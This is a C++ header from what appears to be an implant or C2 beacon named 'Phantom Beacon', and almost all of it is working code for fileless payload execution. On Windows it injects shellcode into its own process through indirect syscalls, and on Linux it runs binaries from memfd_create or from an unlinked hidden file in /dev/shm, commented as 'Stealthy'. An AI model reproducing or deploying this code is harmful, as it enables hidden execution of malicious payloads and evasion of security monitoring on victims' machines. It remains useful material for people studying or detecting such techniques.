#pragma once
// ============================================================================
//  inmemory.h — Phantom Beacon In-Memory Execution (Cross-Platform)
//  ──────────────────────────────────────────────────────────────────────
//  Executes payloads without writing to disk.
//  Windows: Shellcode injection via VirtualAlloc.
//  Linux: Binary execution via memfd_create with legacy fallback.
// ============================================================================

#include <vector>
#include <string>
#include <cstdlib>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#endif

namespace inmemory {

#include "syscalls.h"

#ifdef _WIN32
// Execute Shellcode on Windows using Indirect Syscalls
inline bool run_shellcode(const std::vector<unsigned char>& shellcode) {
    if (shellcode.empty()) return false;

    PVOID pMemory = nullptr;
    SIZE_T size = shellcode.size();
    
    // NtAllocateVirtualMemory
    if (syscalls::SysNtAllocateVirtualMemory(GetCurrentProcess(), &pMemory, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
        return false;
    }

    // NtWriteVirtualMemory (using PEB fallback)
    if (syscalls::SysNtWriteVirtualMemory(GetCurrentProcess(), pMemory, (PVOID)shellcode.data(), shellcode.size(), nullptr) != 0) {
        // We should free memory here
        return false;
    }

    DWORD oldProtect;
    if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pMemory, &size, PAGE_EXECUTE_READ, &oldProtect) != 0) {
        return false;
    }

    // NtCreateThreadEx
    HANDLE hThread = NULL;
    if (syscalls::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PVOID)pMemory, NULL, FALSE, 0, 0, 0, NULL) != 0) {
        return false;
    }

    CloseHandle(hThread);
    return true;
}
#else
// Execute ELF Binary on Linux via memfd_create with fallback to /dev/shm
inline bool run_binary(const std::vector<unsigned char>& binary, const std::string& args = "") {
    if (binary.empty()) return false;

    // Try to create an anonymous file in memory (Modern Linux, Kernel 3.17+)
    int fd = memfd_create("phantom_mem", MFD_CLOEXEC);
    
    // Fallback for older kernels (like Metasploitable 2)
    if (fd == -1) {
        char tmp_path[] = "/dev/shm/.phntmXXXXXX";
        fd = mkstemp(tmp_path);
        if (fd != -1) {
            // Unlink immediately: the file remains accessible via the fd 
            // but is deleted from the directory listing. Stealthy.
            unlink(tmp_path);
        }
    }

    if (fd == -1) return false;

    // Write binary to the anonymous file
    if (write(fd, binary.data(), binary.size()) != (ssize_t)binary.size()) {
        close(fd);
        return false;
    }

    pid_t pid = fork();
    if (pid == 0) { // Child
        // Execute the memory file via /proc/self/fd/
        char fd_path[64];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
        
        execl(fd_path, "phantom_payload", (char*)NULL);
        _exit(1);
    } else if (pid > 0) { // Parent
        close(fd);
        return true;
    }

    close(fd);
    return false;
}
#endif

} // namespace inmemory
